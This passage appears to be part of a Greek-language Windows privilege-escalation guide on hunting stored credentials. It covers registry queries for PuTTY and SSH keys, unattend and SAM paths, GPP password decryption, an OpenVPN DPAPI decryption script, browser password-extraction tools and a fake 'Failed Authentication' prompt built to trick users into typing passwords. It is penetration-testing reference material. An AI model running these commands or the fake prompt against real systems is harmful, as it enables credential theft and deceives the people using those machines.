Το ξεχωριστό αρχείο `Openfire\conf\openfire.xml` μπορεί να αποκαλύψει τις διαμορφωμένες θύρες και τη διεπαφή bind της κονσόλας διαχειριστή, ακόμη κι όταν χρησιμοποιείται εξωτερική βάση δεδομένων. Συνήθως, το Openfire κάνει bind την κονσόλα διαχειριστή στη loopback· ωστόσο, ένας τοπικός λογαριασμός μπορεί να έχει πρόσβαση στη διεύθυνση αν ο listener εκτελείται. Ελέγξτε μαζί τον πραγματικό listener, τον εξουσιοδοτημένο ρόλο διαχειριστή, την πολιτική μεταφόρτωσης plugin και την ταυτότητα της υπηρεσίας Openfire. Ένας διαχειριστής που μπορεί να εγκαταστήσει plugin ενδέχεται να προκαλέσει την εκτέλεση κώδικα του plugin στο πλαίσιο της υπηρεσίας, κάτι που μπορεί να παρέχει υψηλά προνόμια όταν η υπηρεσία εκτελείται ως LocalSystem. Ένας κωδικός πρόσβασης που ταιριάζει ή μια αναγνώσιμη διαδρομή διαμόρφωσης από μόνα τους δεν αποδεικνύουν πρόσβαση στην κονσόλα διαχειριστή ή εκτέλεση κώδικα. Ανατρέξτε στον [οδηγό εγκατάστασης και διαχείρισης plugin του προμηθευτή](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) και στην [ιδιότητα API μεταφόρτωσης plugin](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Διαμόρφωση διακομιστή διαχείρισης εγκληματολογικής ανάλυσης

Οι διαμορφώσεις διακομιστή Velociraptor, που συνήθως ονομάζονται `server.config.yaml`, μπορούν να περιέχουν το `CA.private_key` της εσωτερικής CA. Αν ένας χρήστης με χαμηλότερα προνόμια μπορεί να διαβάσει αυτό το κλειδί, ενδέχεται να μπορεί να δημιουργήσει πιστοποιητικό API client. Το αν αυτό οδηγεί σε περισσότερα προνόμια εξαρτάται από τους ρόλους χρηστών του διακομιστή, την προσβασιμότητα του API και την ταυτότητα με την οποία εκτελείται ο διακομιστής ή ο agent-στόχος. Μια διαμόρφωση client περιέχει διαφορετικό υλικό· η εύρεσή της δεν αποδεικνύει πρόσβαση στην CA του διακομιστή. Σε ορισμένες εγκαταστάσεις, το ιδιωτικό κλειδί της CA διατηρείται εκτός σύνδεσης, οπότε η αναγνώσιμη διαμόρφωση του διακομιστή ενδέχεται να μην περιέχει το κλειδί υπογραφής.

Σε διακομιστή Windows, ελέγξτε τα ACL της διαμόρφωσης **server** στον κατάλογο εγκατάστασής της και τυχόν προστατευμένα αντίγραφα ασφαλείας. Μια πιθανή τοποθεσία είναι `%ProgramFiles%\VelociraptorServer\server.config.yaml`· χρησιμοποιήστε τη διαδρομή που έχει διαμορφωθεί για την υπηρεσία αν διαφέρει. Επιβεβαιώστε ότι η τρέχουσα ταυτότητα μπορεί να διαβάσει το αρχείο και ότι υπάρχει πράγματι το `CA.private_key`. Μην εμφανίζετε το ιδιωτικό κλειδί σε αρχεία καταγραφής ή αποτελέσματα απαρίθμησης. Η ροή εργασίας `config api_client` του προμηθευτή χρησιμοποιεί το κλειδί CA για να εκδώσει πιστοποιητικό client, αλλά απαιτείται επίσης ένας ενεργός ρόλος στην πλευρά του διακομιστή· η δημιουργία ή η αλλαγή ρόλου μπορεί να απαιτεί δικαίωμα εγγραφής στο datastore ή επανεκκίνηση. Μια υπάρχουσα ταυτότητα διακομιστή με προνόμια μπορεί να προσφέρει διαδρομή ακόμη κι όταν αυτές οι εγγραφές δεν είναι διαθέσιμες. Τα ερωτήματα API με δικαιώματα εκτέλεσης εκτελούνται στο σχετικό πλαίσιο διακομιστή ή agent, το οποίο μπορεί να έχει υψηλά προνόμια.

Προστατεύστε τη διαμόρφωση του διακομιστή και τα αντίγραφα ασφαλείας με περιοριστικά ACL, διατηρήστε το κλειδί υπογραφής της CA εκτός σύνδεσης όπου είναι δυνατόν και περιορίστε τους ρόλους API και την πρόσβαση στους listeners. Ανατρέξτε στην [τεκμηρίωση API του Velociraptor](https://docs.velociraptor.app/docs/server_automation/server_api/) και στις [οδηγίες διαμόρφωσης ασφάλειας](https://docs.velociraptor.app/docs/deployment/security/).

### Διαπιστευτήρια PuTTY

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Το Solar-PuTTY είναι ξεχωριστός διαχειριστής συνεδριών. Το εγγενές κρυπτογραφημένο αποθετήριό του μπορεί να βρίσκεται στη διαδρομή `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, ενώ ένα εξαγόμενο αντίγραφο ασφαλείας συνεδριών μπορεί να ονομάζεται `sessions-backup.dat` και να είναι αποθηκευμένο αλλού. Ο [οδηγός εξαγωγής της SolarWinds](https://thwack.solarwinds.com/discussion/comment/115591) αναφέρει ότι οι εξαγωγές είναι κρυπτογραφημένες με κωδικό πρόσβασης και μπορεί να περιέχουν συνεδρίες, κλειδιά, scripts, tags και σχέσεις· το [φόρουμ υποστήριξης](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) προσδιορίζει το εγγενές αποθετήριο. Ελέγξτε πρώτα τα δικαιώματα και τις διαδρομές των αρχείων. Η εύρεση οποιουδήποτε από αυτά τα αρχεία δεν αποκαλύπτει τον κωδικό πρόσβασής του ούτε αποδεικνύει ότι τυχόν αποθηκευμένα διαπιστευτήρια εξακολουθούν να ισχύουν ή να παρέχουν αυξημένα δικαιώματα.

### Κλειδιά Host SSH του PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Κλειδιά SSH στο registry

Τα ιδιωτικά κλειδιά SSH μπορούν να αποθηκεύονται στο κλειδί registry `HKCU\Software\OpenSSH\Agent\Keys`, επομένως θα πρέπει να ελέγξετε αν υπάρχει κάτι ενδιαφέρον εκεί:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Αν βρείτε κάποια καταχώριση σε αυτήν τη διαδρομή, πιθανότατα πρόκειται για αποθηκευμένο SSH key. Είναι αποθηκευμένο κρυπτογραφημένο, αλλά μπορεί να αποκρυπτογραφηθεί εύκολα χρησιμοποιώντας το [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Περισσότερες πληροφορίες σχετικά με αυτήν την τεχνική: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Αν η υπηρεσία `ssh-agent` δεν εκτελείται και θέλετε να ξεκινά αυτόματα κατά την εκκίνηση, εκτελέστε:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Φαίνεται ότι αυτή η τεχνική δεν είναι πλέον έγκυρη. Προσπάθησα να δημιουργήσω μερικά κλειδιά SSH, να τα προσθέσω με το `ssh-add` και να συνδεθώ μέσω SSH σε ένα μηχάνημα. Το κλειδί μητρώου HKCU\Software\OpenSSH\Agent\Keys δεν υπάρχει και το procmon δεν εντόπισε χρήση του `dpapi.dll` κατά τον έλεγχο ταυτότητας με ασύμμετρο κλειδί.

### Αρχεία unattended

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Μπορείτε επίσης να αναζητήσετε αυτά τα αρχεία χρησιμοποιώντας το **metasploit**: _post/windows/gather/enum_unattend_

Παράδειγμα περιεχομένου:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Αντίγραφα ασφαλείας SAM & SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Τα αναγνώσιμα αρχεία αντιγράφων ασφαλείας Windows Imaging (`.wim`) μπορεί επίσης να περιέχουν offline hives `SAM`, `SECURITY` και `SYSTEM`. Δώστε προτεραιότητα σε τοπικά προσβάσιμους καταλόγους αντιγράφων ασφαλείας ή image και ελέγξτε τα **ονόματα των μελών** ενός image πριν από την εξαγωγή οτιδήποτε· το όνομα αρχείου `.wim` από μόνο του δεν αποδεικνύει ότι εκτίθενται hives, ενώ τα συνηθισμένα `install.wim`, `boot.wim` και τα image αποκατάστασης συχνά είναι παραπλανητικά. Ένα SMB share αποτελεί ξεχωριστή διαδρομή πρόσβασης και πρέπει να ελέγχεται μόνο όταν το συγκεκριμένο share είναι εντός πεδίου. Δείτε τις οδηγίες της Microsoft για τα [Windows image](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) και την [αναφορά αρχείων registry hive](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Διαπιστευτήρια Cloud

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Αναζητήστε ένα αρχείο με όνομα **SiteList.xml**

### Αποθηκευμένος κωδικός πρόσβασης GPP

Παλαιότερα υπήρχε μια δυνατότητα που επέτρεπε την ανάπτυξη προσαρμοσμένων τοπικών λογαριασμών διαχειριστή σε μια ομάδα μηχανημάτων μέσω των Group Policy Preferences (GPP). Ωστόσο, αυτή η μέθοδος είχε σημαντικά κενά ασφαλείας. Πρώτον, τα Group Policy Objects (GPOs), τα οποία αποθηκεύονταν ως αρχεία XML στο SYSVOL, ήταν προσβάσιμα σε οποιονδήποτε χρήστη του domain. Δεύτερον, οποιοσδήποτε πιστοποιημένος χρήστης μπορούσε να αποκρυπτογραφήσει τους κωδικούς πρόσβασης σε αυτά τα GPP, οι οποίοι ήταν κρυπτογραφημένοι με AES256 χρησιμοποιώντας ένα δημόσια τεκμηριωμένο προεπιλεγμένο κλειδί. Αυτό αποτελούσε σοβαρό κίνδυνο, καθώς μπορούσε να επιτρέψει στους χρήστες να αποκτήσουν αυξημένα δικαιώματα.

Για να μετριαστεί αυτός ο κίνδυνος, αναπτύχθηκε μια συνάρτηση που αναζητά τοπικά αποθηκευμένα αρχεία GPP τα οποία περιέχουν ένα πεδίο "cpassword" με μη κενή τιμή. Όταν εντοπίζει ένα τέτοιο αρχείο, η συνάρτηση αποκρυπτογραφεί τον κωδικό πρόσβασης και επιστρέφει ένα προσαρμοσμένο αντικείμενο PowerShell. Το αντικείμενο περιλαμβάνει λεπτομέρειες για το GPP και τη θέση του αρχείου, διευκολύνοντας τον εντοπισμό και την αποκατάσταση αυτής της ευπάθειας ασφαλείας.

Αναζητήστε αυτά τα αρχεία στις τοποθεσίες `C:\ProgramData\Microsoft\Group Policy\history` ή _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (πριν από τα Windows Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Για να αποκρυπτογραφήσετε το cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Χρήση του crackmapexec για την απόκτηση των κωδικών πρόσβασης:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Παράδειγμα του web.config με διαπιστευτήρια:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Αντίγραφα ασφαλείας σε αρχεία μέσα σε IIS webroot

Ένα παλιό αντίγραφο ασφαλείας ZIP τοποθετημένο απευθείας σε webroot που εξυπηρετείται ενδέχεται να αποκαλύψει παλαιότερα αρχεία ρυθμίσεων και επαναχρησιμοποιήσιμα διαπιστευτήρια. Ελέγξτε τη διαμορφωμένη φυσική διαδρομή του ιστότοπου και αν το αρχείο είναι πράγματι προσβάσιμο μέσω HTTP, προτού το θεωρήσετε έκθεση. Η προεπιλεγμένη διαδρομή `C:\inetpub\wwwroot` είναι απλώς μια πιθανή επιλογή. Μια γρήγορη τοπική καταγραφή μπορεί να εμφανίσει ονόματα και μεγέθη χωρίς να ανοίξει τα αρχεία:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Το όνομα ενός αρχείου αρχειοθέτησης δεν αποδεικνύει ότι περιέχει κάποιο μυστικό ή ότι ένα διαπιστευτήριο που ανακτήθηκε παρέχει υψηλότερα προνόμια.

### Διαπιστευτήρια OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Αρχεία καταγραφής

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Ζητήστε διαπιστευτήρια

Μπορείτε πάντα να **ζητήσετε από τον χρήστη να εισαγάγει τα διαπιστευτήριά του ή ακόμη και τα διαπιστευτήρια ενός διαφορετικού χρήστη**, αν πιστεύετε ότι μπορεί να τα γνωρίζει (σημειώστε ότι το να ζητήσετε απευθείας από τον **πελάτη** τα **διαπιστευτήρια** είναι πραγματικά **επικίνδυνο**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Πιθανά ονόματα αρχείων που περιέχουν διαπιστευτήρια**

Γνωστά αρχεία που κάποτε περιείχαν **κωδικούς πρόσβασης** σε **απλό κείμενο** ή **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Οι βάσεις δεδομένων Password Safe v3 χρησιμοποιούν συνήθως την επέκταση `.psafe3`. Αντιμετωπίστε ένα αρχείο με αντίστοιχο όνομα ως πιθανό κρυπτογραφημένο θησαυροφυλάκιο· η παρουσία του δεν αποδεικνύει ότι μπορείτε να το διαβάσετε, να το ξεκλειδώσετε ή να χρησιμοποιήσετε αποθηκευμένα διαπιστευτήρια. Κατά τον έλεγχο της αποθήκευσης τέτοιων αρχείων, εξετάστε τα προσβάσιμα προφίλ χρηστών και τις διαμορφωμένες ρίζες κοινόχρηστων αρχείων.

Ένα αναγνώσιμο αρχείο KeePass `.kdbx` αποτελεί επίσης μόνο ένδειξη πιθανού κρυπτογραφημένου θησαυροφυλακίου. Για να το ξεκλειδώσετε, απαιτείται ο πραγματικός κύριος κωδικός πρόσβασης, καθώς και τυχόν διαμορφωμένο αρχείο κλειδιού ή παράγοντες λογαριασμού. Αν ένας εξουσιοδοτημένος έλεγχος εντοπίσει σε κάποια καταχώριση ζεύγος hash LM:NT, επαληθεύστε τον αναφερόμενο λογαριασμό και αν το NT hash είναι τρέχον και γίνεται αποδεκτό από την υπηρεσία NTLM του στόχου, προτού εξετάσετε το ενδεχόμενο [pass-the-hash](../ntlm/README.md#pass-the-hash). Μια καταχώριση στο θησαυροφυλάκιο δεν παρέχει από μόνη της δικαιώματα Administrator ή SYSTEM· πρέπει επίσης να ισχύουν η πρόσβαση σε απομακρυσμένη υπηρεσία, τα δικαιώματα του λογαριασμού και τυχόν ξεχωριστό βήμα εκτέλεσης υπηρεσίας. Η απογραφή θα πρέπει να αναφέρει τη διαδρομή του θησαυροφυλακίου και αν είναι αναγνώσιμο, όχι να εμφανίζει τη βάση δεδομένων ή τα αποθηκευμένα διαπιστευτήρια.

Αναζητήστε όλα τα προτεινόμενα αρχεία:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Διαπιστευτήρια στον Κάδο Ανακύκλωσης

Ελέγξτε τις προσβάσιμες εγγραφές του Κάδου Ανακύκλωσης για διαγραμμένα αντίγραφα ασφαλείας και αρχεία ρυθμίσεων, καθώς και για αρχεία με ονόματα που αναφέρουν ρητά διαπιστευτήρια. Ένα χρήσιμο αντίγραφο ασφαλείας `.7z`, `.zip` ή `.rar` μπορεί να είναι μηνών και να έχει ένα συνηθισμένο όνομα αρχείου. Τα Windows αποθηκεύουν την αρχική διαδρομή και τον χρόνο διαγραφής σε μια εγγραφή `$I`, ενώ το διαγραμμένο αρχείο αποθηκεύεται στην αντίστοιχη εγγραφή `$R`. Εξετάστε τα μεταδεδομένα και επιβεβαιώστε ότι η τρέχουσα ταυτότητα έχει δικαίωμα ανάγνωσης πριν ανοίξετε ένα αρχείο αρχειοθέτησης. Η ορατότητα εξαρτάται από τον τόμο, το SID χρήστη και τα δικαιώματα αρχείων, επομένως μια κενή λίστα δεν αποδεικνύει ότι δεν υπάρχει ανακτήσιμο αντίγραφο ασφαλείας. Αντιμετωπίστε το όνομα ενός αρχείου αρχειοθέτησης ως υποψήφιο για έλεγχο, όχι ως απόδειξη ότι περιέχει έγκυρο μυστικό.

Ένα προσβάσιμο διαγραμμένο `.pfx` μπορεί επίσης να αποτελέσει ένδειξη για **υπογραφή κώδικα**. Αν περιέχει προσβάσιμο ιδιωτικό κλειδί, το κλειδί μπορεί να υπογράψει ένα τροποποιημένο script PowerShell. Το [PowerShell απαιτεί πιστοποιητικό υπογραφής κώδικα με ιδιωτικό κλειδί](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), ενώ οι [κανόνες εκδότη του AppLocker αξιολογούν την ταυτότητα του υπογράφοντος και το πεδίο εφαρμογής του κανόνα](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Για εκτέλεση μεταξύ λογαριασμών απαιτούνται η δυνατότητα τροποποίησης του συγκεκριμένου script από την τρέχουσα ταυτότητα, ένας ενεργός κανόνας που αποδέχεται την υπογραφή που προκύπτει για το script και τον λογαριασμό-στόχο, καθώς και μια προγραμματισμένη εργασία ή άλλη διεργασία με υψηλότερα προνόμια που όντως το εκτελεί. Το όνομα ενός αρχείου `.pfx`, το θέμα ενός πιστοποιητικού ή απλώς η δυνατότητα εγγραφής σε ένα script δεν τεκμηριώνουν από μόνα τους αυτή την αλυσίδα. Εξετάστε τα μεταδεδομένα, τις ACL, την πολιτική και την προγραμματισμένη εντολή πριν ανοίξετε υλικό ιδιωτικού κλειδιού ή ενεργοποιήσετε την εργασία.

Εξετάστε επίσης προσβάσιμες βάσεις δεδομένων προφίλ προγραμμάτων ανταλλαγής μηνυμάτων, σημειώσεις και ληφθέντα αρχεία για ενδείξεις διαπιστευτηρίων. Ένα εξαγόμενο κλειδί ανάκτησης BitLocker μπορεί να είναι αποθηκευμένο ως HTML ή TXT, μερικές φορές μέσα σε ένα επώνυμο αντίγραφο ασφαλείας. Τέτοιο υλικό μπορεί να παρέχει πρόσβαση σε ξεχωριστό κρυπτογραφημένο τόμο δεδομένων που περιέχει παλαιότερα αντίγραφα ασφαλείας. Εξετάστε τον τόμο και το αρχείο αρχειοθέτησης μόνο εφόσον έχετε εξουσιοδότηση πρόσβασης. Αν ένα αντίγραφο ασφαλείας περιλαμβάνει το `NTDS.dit`, η ανάκτηση διαπιστευτηρίων τομέα εκτός σύνδεσης απαιτεί επίσης την αντίστοιχη κυψέλη `SYSTEM`, όπως περιγράφεται στη [ροή εργασιών για αντίγραφα ασφαλείας και προνομιούχες ομάδες](../active-directory-methodology/privileged-groups-and-token-privileges.md). Τα ονόματα αρχείων και ένας κλειδωμένος τόμος από μόνα τους δεν αποδεικνύουν ότι υπάρχει χρησιμοποιήσιμο κλειδί ανάκτησης ή αντίγραφο ασφαλείας τομέα.

Για να **ανακτήσετε κωδικούς πρόσβασης** που έχουν αποθηκευτεί από διάφορα προγράμματα, μπορείτε να χρησιμοποιήσετε το εξής: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Μέσα στο registry

**Άλλα πιθανά κλειδιά registry με διαπιστευτήρια**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Εξαγωγή κλειδιών openssh από το registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Ιστορικό browser

Θα πρέπει να ελέγξετε για βάσεις δεδομένων όπου αποθηκεύονται κωδικοί πρόσβασης από **Chrome, Edge ή Firefox**.\
Ελέγξτε επίσης το ιστορικό, τους σελιδοδείκτες και τα αγαπημένα των browser, καθώς μπορεί να είναι αποθηκευμένοι εκεί κάποιοι **κωδικοί πρόσβασης**.

Για το συμβατικό προφίλ **Default** του Edge του τρέχοντος χρήστη, το `Login Data` βρίσκεται στο `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, ενώ το `Local State` βρίσκεται στον γονικό κατάλογο `User Data`. [Η Microsoft τεκμηριώνει την προεπιλεγμένη θέση προφίλ](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars)· κάποιο άλλο προφίλ ή μια πολιτική `UserDataDir` μπορεί να αλλάξει τη θέση. Η παρουσία αρχείων αποτελεί μόνο ένδειξη για αποθήκη διαπιστευτηρίων: επιβεβαιώστε ότι τα αρχεία είναι αναγνώσιμα, ότι υπάρχει το περιβάλλον DPAPI του αντίστοιχου χρήστη ή άλλο εξουσιοδοτημένο υλικό κλειδιών και ότι τα αποθηκευμένα στοιχεία σύνδεσης ανήκουν σε λογαριασμό με περισσότερα προνόμια. Η απαρίθμηση μόνο των διαδρομών δεν χρειάζεται να ανοίξει τη βάση δεδομένων ή να εμφανίσει αποκρυπτογραφημένους κωδικούς πρόσβασης.

Για τον Firefox, [η Mozilla τεκμηριώνει](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) ότι τα `key4.db` και `logins.json` ενός προφίλ είναι τα αντίστοιχα αρχεία κλειδιού και κρυπτογραφημένων στοιχείων σύνδεσης. Η παρουσία τους αποτελεί μόνο ένδειξη: ελέγξτε αν είναι και τα δύο αρχεία αναγνώσιμα, αν υπάρχουν αποθηκευμένες καταχωρίσεις και αν το κλειδί προστατεύεται από Primary Password, προτού συμπεράνετε ότι τα διαπιστευτήρια μπορούν να χρησιμοποιηθούν. Αν ένα διαπιστευτήριο που ανακτήθηκε ανήκει σε λογαριασμό domain, ελέγξτε ξεχωριστά τα ισχύοντα δικαιώματα ελέγχου ομάδων του λογαριασμού και τα [δικαιώματα ανάγνωσης ή αποκρυπτογράφησης κωδικών LAPS](../active-directory-methodology/laps.md) της ομάδας· τα ευρήματα από browser από μόνα τους δεν αποδεικνύουν ότι υπάρχει διαδρομή προς δικαιώματα διαχειριστή.

Εργαλεία για την εξαγωγή κωδικών πρόσβασης από browser:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Το **Component Object Model (COM)** είναι μια τεχνολογία ενσωματωμένη στο λειτουργικό σύστημα Windows, η οποία επιτρέπει την **επικοινωνία** μεταξύ στοιχείων λογισμικού που έχουν γραφτεί σε διαφορετικές γλώσσες. Κάθε στοιχείο COM **αναγνωρίζεται μέσω ενός class ID (CLSID)** και κάθε στοιχείο εκθέτει λειτουργικότητα μέσω μίας ή περισσότερων διεπαφών, οι οποίες αναγνωρίζονται μέσω interface IDs (IIDs).

Οι κλάσεις και οι διεπαφές COM ορίζονται στο registry, αντίστοιχα, στα **HKEY\CLASSES\ROOT\CLSID** και **HKEY\CLASSES\ROOT\Interface**. Αυτό το registry δημιουργείται με τη συγχώνευση των **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Μέσα στα CLSIDs αυτού του registry μπορείτε να βρείτε το θυγατρικό κλειδί registry **InProcServer32**, το οποίο περιέχει μια **προεπιλεγμένη τιμή** που δείχνει σε ένα **DLL** και μια τιμή με όνομα **ThreadingModel**, η οποία μπορεί να είναι **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single ή Multi) ή **Neutral** (Thread Neutral).

![Ιστορικό browser - COM DLL Overwriting: Μέσα στα CLSIDs αυτού του registry μπορείτε να βρείτε το θυγατρικό κλειδί registry InProcServer32, το οποίο περιέχει μια προεπιλεγμένη τιμή που δείχνει σε ένα DLL και μια τιμή...](<../../images/image (729).png>)

